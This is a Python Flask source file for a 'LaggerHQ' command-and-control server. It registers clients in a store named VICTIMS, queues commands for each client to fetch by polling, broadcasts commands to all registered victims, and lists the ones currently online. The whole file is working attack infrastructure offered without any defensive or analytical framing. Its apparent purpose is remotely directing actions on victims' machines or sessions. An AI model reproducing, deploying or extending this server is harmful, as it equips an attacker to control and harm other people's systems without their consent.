from flask import Flask, request, jsonify
import time

app = Flask(__name__)

# In-memory storage (clears on restart)
VICTIMS = {}
COMMAND_QUEUE = {}

@app.route('/')
def home():
    return "LaggerHQ API is Running."

@app.route('/register', methods=['POST'])
def register():
    data = request.json
    uid = str(data.get('userid'))
    username = data.get('username')
    
    if not uid or not username:
        return jsonify({"error": "Invalid data"}), 400
        
    VICTIMS[uid] = {
        "name": username,
        "last_seen": time.time()
    }
    
    # Initialize command queue for this user if not exists
    if uid not in COMMAND_QUEUE:
        COMMAND_QUEUE[uid] = "NO_CMD"
        
    return jsonify({"status": "registered", "uid": uid})

@app.route('/poll/<uid>', methods=['GET'])
def poll(uid):
    uid = str(uid)
    if uid in VICTIMS:
        VICTIMS[uid]['last_seen'] = time.time()
    
    cmd = COMMAND_QUEUE.get(uid, "NO_CMD")
    
    # Clear command after sending (one-time execution)
    # Exception: We don't clear it immediately if we want persistence, 
    # but for simple commands, consuming it is better.
    # However, for 'ALL' broadcasts, we handled it differently.
    # Let's simple consume it.
    if cmd != "NO_CMD":
        COMMAND_QUEUE[uid] = "NO_CMD"
        
    return jsonify({"command": cmd})

@app.route('/command', methods=['POST'])
def send_command():
    data = request.json
    target_id = str(data.get('target'))
    cmd = data.get('command')
    
    if not target_id or not cmd:
        return jsonify({"error": "Missing target or command"}), 400
        
    if target_id == "ALL":
        count = 0
        for uid in VICTIMS:
            COMMAND_QUEUE[uid] = cmd
            count += 1
        return jsonify({"status": "broadcast_queued", "count": count, "cmd": cmd})
    else:
        COMMAND_QUEUE[target_id] = cmd
        return jsonify({"status": "queued", "target": target_id, "cmd": cmd})

@app.route('/victims', methods=['GET'])
def get_victims():
    # Optional: Clean up old victims (offline > 30s)
    current_time = time.time()
    offline_threshold = 30
    
    active_victims = {}
    to_remove = []
    
    for uid, data in VICTIMS.items():
        if current_time - data['last_seen'] < offline_threshold:
            active_victims[uid] = data
        else:
            to_remove.append(uid)
            
    # Remove offline
    for uid in to_remove:
        del VICTIMS[uid]
        if uid in COMMAND_QUEUE:
            del COMMAND_QUEUE[uid]
            
    return jsonify(active_victims)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
